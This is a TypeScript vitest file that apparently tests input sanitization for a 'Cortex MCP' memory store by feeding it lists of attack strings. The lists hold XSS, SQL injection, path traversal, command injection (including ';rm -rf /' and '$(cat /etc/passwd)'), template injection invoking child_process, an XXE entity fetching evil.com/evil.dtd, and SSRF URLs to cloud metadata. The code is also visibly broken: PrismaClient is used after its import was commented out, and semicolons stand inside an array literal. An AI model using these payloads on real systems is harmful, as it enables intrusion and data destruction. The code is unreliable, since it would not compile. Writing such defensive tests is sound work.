/**
 * Cortex MCP System - Data Sanitization Security Tests
 *
 * Tests for data sanitization, content security, and prevention
 * of malicious content injection in various data fields.
 *
 * @version 1.0.0
 */

import { describe, test, expect, beforeAll, afterAll } from 'vitest';
// PrismaClient removed - system now uses Qdrant + PostgreSQL architecture';
import { validateMemoryStoreInput, validateMemoryFindInput } from '../../../src/schemas/mcp-inputs';

describe('Data Sanitization Security Tests', () => {
  let prisma: PrismaClient;
  let testProjectId: string;

  beforeAll(async () => {
    prisma = new PrismaClient();
    testProjectId = 'data-sanitization-test';
  });

  afterAll(async () => {
    // Cleanup test data
    await prisma.observation.deleteMany({
      where: { project: testProjectId, created_by: 'sanitization-test' }
    });
    await prisma.entity.deleteMany({
      where: { project: testProjectId, created_by: 'sanitization-test' }
    });
    await prisma.assumption.deleteMany({
      where: { project: testProjectId, created_by: 'sanitization-test' }
    });
    await prisma.risk.deleteMany({
      where: { project: testProjectId, created_by: 'sanitization-test' }
    });
    await prisma.incident.deleteMany({
      where: { project: testProjectId, created_by: 'sanitization-test' }
    });
    await prisma.release.deleteMany({
      where: { project: testProjectId, created_by: 'sanitization-test' }
    });
    await prisma.ddl_log.deleteMany({
      where: { project: testProjectId, created_by: 'sanitization-test' }
    });
    await prisma.$disconnect();
  });

  describe('JSON Content Security', () => {
    test('should handle malicious JSON payloads', () => {
      const maliciousJsonPayloads = [
        // Prototype pollution attempts
        { '__proto__': { 'admin': true } },
        { 'constructor': { 'prototype': { 'admin': true } } },
        { 'prototype': { 'admin': true } },

        // Circular references (should be handled gracefully)
        { 'circular': null },

        // Very deep nesting (potential DoS)
        { 'a': { 'b': { 'c': { 'd': { 'e': { 'f': { 'g': { 'h': { 'i': { 'j': { 'k': 'deep' } } } } } } } } } } },

        // Large JSON objects (potential DoS)
        { 'large': 'x'.repeat(1000000) },

        // Special characters that could break parsing
        { 'quotes': '"quotes"' },
        { 'backslashes': '\\\\backslashes\\\\' },
        { 'newlines': '\n\nnewlines\n\n' },
        { 'tabs': '\t\ttabs\t\t' },
        { 'unicode': '\u0000\u001f\ufffe\uffff' },

        // SQL injection in JSON values
        { 'query': "'; DROP TABLE entity; --" },
        { 'sql': "' OR '1'='1" },

        // XSS in JSON values
        { 'xss': '<script>alert("XSS")</script>' },
        { 'html': '<img src="x" onerror="alert(1)">' },

        // Path traversal in JSON values
        { 'file': '../../../etc/passwd' },
        { 'path': '..\\..\\windows\\system32\\config\\sam' },

        // Command injection in JSON values
        { 'cmd': '`whoami`' },
        { 'shell': '$(whoami)' },
        { 'powershell': 'Get-Process' },

        // LDAP injection in JSON values
        { 'ldap': '*)(uid=*' },
        { 'ldap2': '*)|(uid=*' },

        // NoSQL injection in JSON values
        { 'nosql': { '$ne': null } },
        { 'nosql2': { '$where': 'true' } },
        { 'nosql3': { '$gt': '' } }
      ];

      maliciousJsonPayloads.forEach(payload => {
        const testInput = {
          items: [{
            kind: 'entity',
            scope: { project: testProjectId },
            data: payload
          }]
        };

        // Should not throw validation errors (JSON schema allows any())
        expect(() => validateMemoryStoreInput(testInput)).not.toThrow();

        // The payload should be stored as-is but sanitized when used
        const result = validateMemoryStoreInput(testInput);
        expect(result.items[0].data).toEqual(payload);
      });
    });

    test('should handle JSON parsing attacks', () => {
      const maliciousJsonStrings = [
        // Malformed JSON that could crash parsers
        '{"unclosed": "string"',
        '{"extra": }',
        '{"comma": "here",}',
        '{null}',
        'undefined',

        // JSON with comments (not standard JSON)
        '{"comment": "here" /* comment */}',
        '{"line": "comment" // comment}',

        // JSON with binary data
        '{"binary": "\x00\x01\x02\x03"}',
        '{"binary": "\\u0000\\u0001"}',

        // JSON with control characters
        '{"control": "\r\n\t\b\f"}',

        // Very long JSON strings
        '{"long": "' + 'a'.repeat(1000000) + '"}',

        // JSON with many properties
        '{' + Array.from({length: 1000}, (_, i) => `"prop${i}": "value${i}"`).join(',') + '}'
      ];

      maliciousJsonStrings.forEach(jsonString => {
        try {
          // This should be handled by the validation layer
          const parsed = JSON.parse(jsonString);

          const testInput = {
            items: [{
              kind: 'entity',
              scope: { project: testProjectId },
              data: parsed
            }]
          };

          expect(() => validateMemoryStoreInput(testInput)).not.toThrow();
        } catch (parseError) {
          // If JSON parsing fails, that's expected and good
          expect(parseError).toBeInstanceOf(SyntaxError);
        }
      });
    });
  });

  describe('Text Content Sanitization', () => {
    test('should handle malicious text content safely', async () => {
      const maliciousTexts = [
        // XSS payloads
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(1)',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<select onfocus="alert(1)" autofocus>',
        '<textarea onfocus="alert(1)" autofocus>',
        '<keygen onfocus="alert(1)" autofocus>',
        '<video><source onerror="alert(1)">',
        '<audio src="x" onerror="alert(1)">',
        '<details open ontoggle="alert(1)">',
        '<marquee onstart="alert(1)">',
        '"><script>alert(1)</script>',
        '\"><script>alert(1)</script>',
        "'><script>alert(1)</script>",

        // SQL injection payloads
        "'; DROP TABLE entity; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM entity --",
        "'; SELECT pg_sleep(5); --",
        "'; COPY entity TO '/tmp/hack.csv'; --",
        "'; ALTER TABLE entity DROP COLUMN name; --",
        "'; TRUNCATE entity; --",
        "'; CREATE TABLE hack (id INT); --",
        "'; GRANT ALL ON SCHEMA public TO public; --",

        // Path traversal payloads
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        '/proc/version',
        '/proc/self/environ',
        '/proc/self/cmdline',
        '/proc/self/mem',

        // Command injection payloads
        '`whoami`',
        '$(whoami)',
        '|whoami',
        ';whoami',
        '&&whoami',
        '||whoami',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        '|ls -la',
        ';rm -rf /',
        '&&format c:',

        // LDAP injection payloads
        '*)(uid=*',
        '*)|(uid=*',
        '*)(objectClass=*)',
        '*)(|(objectClass=*)',

        // Template injection payloads
        '{{7*7}}',
        '{{config}}',
        '{{constructor.constructor("alert(1)")()}}',
        '${7*7}',
        '#{7*7}',
        "{{''.constructor.prototype.charAt=[].join;$eval('x=\\'alert(1)\\';process.mainModule.require(\\'child_process\\').execSync(\\'echo ALERT\\')');}}",

        // XXE injection payloads
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]>',

        // SSRF payloads
        'http://localhost:8080/admin',
        'http://127.0.0.1:22',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'ftp://evil.com/',
        'ldap://evil.com/',
        'gopher://evil.com:70/',

        // Log injection payloads
        'test\n[INFO] Admin login successful\n',
        'test\r\n[ERROR] System compromised\r\n',
        'test\u0000[CRITICAL] Security breach\u0000',

        // Control characters
        '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F',
        '\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F',
        '\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F',

        // Unicode attacks
        '\u202E'; // Right-to-left override
        '\u200E'; // Left-to-right mark
        '\u2066'; // Left-to-right isolate
        '\u2067'; // Right-to-left isolate
        '\u2069'; // Pop directional isolate
        '\uFEFF'; // BOM
        '\uFFFD'; // Replacement character

        // Binary data
        Buffer.from([0x00, 0x01, 0x02, 0x03]).toString(),
        String.fromCharCode(0, 1, 2, 3, 4, 5),

        // Very long strings
        'a'.repeat(1000000),
        '😀'.repeat(100000),

        // Mixed content
        'Normal text<script>alert("XSS")</script>More text',
        'Start\x00\x01\x02Middle\xFF\xFE\xFDEnd',
        'Begin\u202E RTL override\u202C End'
      ];

      // Test with entity creation
      for (const maliciousText of maliciousTexts) {
        const entity = await prisma.entity.create({
          data: {
            name: maliciousText.substring(0, 200), // Truncate to fit DB constraint
            type: 'sanitization-test',
            project: testProjectId,
            created_by: 'sanitization-test'
          }
        });

        expect(entity.name).toContain(maliciousText.substring(0, 200));

        await prisma.entity.delete({
          where: { id: entity.id }
        });
      }
    });
  });

  describe('Content Type Validation', () => {
    test('should validate content types in different fields', async () => {
      const testCases = [
        {
          model: 'entity',
          data: {
            name: 'Test Entity',
            type: 'test',
            description: 123, // Should be string
            project: testProjectId,
            created_by: 'sanitization-test'
          },
          shouldFail: false // Prisma may coerce numbers to strings
        },
        {
          model: 'entity',
          data: {
            name: 'Test Entity',
            type: 'test',
            created_at: 'not-a-date', // Should be DateTime
            project: testProjectId,
            created_by: 'sanitization-test'
          },
          shouldFail: true
        },
        {
          model: 'risk',
          data: {
            title: 'Test Risk',
            description: 'Test description',
            impact_probability: 'not-a-number', // Should be Decimal
            impact_severity: 'low',
            project: testProjectId,
            created_by: 'sanitization-test'
          },
          shouldFail: true
        },
        {
          model: 'risk',
          data: {
            title: 'Test Risk',
            description: 'Test description',
            impact_probability: 1.5, // Should be <= 1.0
            impact_severity: 'low',
            project: testProjectId,
            created_by: 'sanitization-test'
          },
          shouldFail: true
        },
        {
          model: 'observation',
          data: {
            entity_id: 'not-a-uuid',
            fact: 'Test observation',
            project: testProjectId,
            created_by: 'sanitization-test'
          },
          shouldFail: true
        }
      ];

      for (const testCase of testCases) {
        if (testCase.shouldFail) {
          await expect(
            (prisma as any)[testCase.model].create({ data: testCase.data })
          ).rejects.toThrow();
        } else {
          // May succeed due to Prisma coercion
          try {
            const result = await (prisma as any)[testCase.model].create({
              data: testCase.data
            });
            expect(result).toBeDefined();
          } catch (error) {
            // Also acceptable if it fails
            expect(error).toBeDefined();
          }
        }
      }
    });
  });

  describe('Content Encoding Security', () => {
    test('should handle various text encodings safely', () => {
      const encodingTests = [
        // UTF-8 with BOM
        '\uFEFFTest content with BOM',

        // Unicode normalization attacks
        '\u0065\u0301', // é as e + combining acute accent
        '\u00E9', // é as single character

        // Homoglyph attacks
        'аdmin', // Cyrillic 'а' instead of Latin 'a'
        'pаypal', // Cyrillic 'а' instead of Latin 'a'
        'gооgle', // Cyrillic 'о' instead of Latin 'o'

        // Zero-width characters
        'test\u200Bcontent', // Zero-width space
        'test\u200Ccontent', // Zero-width non-joiner
        'test\u200Dcontent', // Zero-width joiner
        'test\uFEFFcontent', // Zero-width no-break space

        // Invisible characters
        'test\u2060content', // Word joiner
        'test\u180Econtent', // Mongolian vowel separator
        'test\u061Ccontent', // Arabic letter mark

        // Directional override attacks
        'test\u202Econtent', // Right-to-left override
        'test\u202Dcontent', // Left-to-right override
        'test\u202Acontent', // Left-to-right embedding
        'test\u202Bcontent', // Right-to-left embedding

        // Mixed scripts
        'Hello世界مرحبا',
        'Test\u0301\u0302\u0303\u0304', // Combining characters
        'Test\u0340\u0341\u0342\u0343', // Combining tone marks
      ];

      encodingTests.forEach(encodedText => {
        const testInput = {
          items: [{
            kind: 'entity',
            scope: { project: testProjectId },
            data: {
              name: encodedText,
              content: `Content with encoded text: ${encodedText}`
            }
          }]
        };

        expect(() => validateMemoryStoreInput(testInput)).not.toThrow();

        const result = validateMemoryStoreInput(testInput);
        expect(result.items[0].data.name).toBe(encodedText);
      });
    });
  });

  describe('File Upload and Content Security', () => {
    test('should validate file-like content in metadata', () => {
      const maliciousFileContent = [
        // Fake file headers
        '\x89PNG\r\n\x1a\n', // PNG header
        '\xff\xd8\xff\xe0', // JPEG header
        'GIF87a', // GIF header
        '%PDF-', // PDF header
        'PK\x03\x04', // ZIP header
        '\x1f\x8b\x08', // GZIP header

        // Executable headers
        'MZ', // PE/Windows executable
        '\x7fELF', // Linux executable
        '\xca\xfe\xba\xbe', // Java class
        '\xfe\xed\xfa\xce', // Mach-O binary (macOS)

        // Script content
        '#!/bin/bash',
        '#!/usr/bin/env python',
        '#!/usr/bin/env node',
        '#!/usr/bin/env ruby',
        '#!/usr/bin/env perl',
        '<script>',
        '<?php',
        '<%',
        '{{',
        '${',

        // Malicious file names
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        'file.txt\x00.exe', // Null byte injection
        'normal.txt\r\n.exe', // CRLF injection
        'file.txt\u202eexe.exe', // Right-to-left override
        'file.txt\u200b.exe', // Zero-width space
      ];

      maliciousFileContent.forEach(fileContent => {
        const testInput = {
          items: [{
            kind: 'entity',
            scope: { project: testProjectId },
            data: {
              name: 'file-test',
              metadata: {
                file_name: 'test.txt',
                file_content: fileContent,
                file_type: 'text/plain'
              }
            }
          }]
        };

        expect(() => validateMemoryStoreInput(testInput)).not.toThrow();

        const result = validateMemoryStoreInput(testInput);
        expect(result.items[0].data.metadata.file_content).toBe(fileContent);
      });
    });
  });
});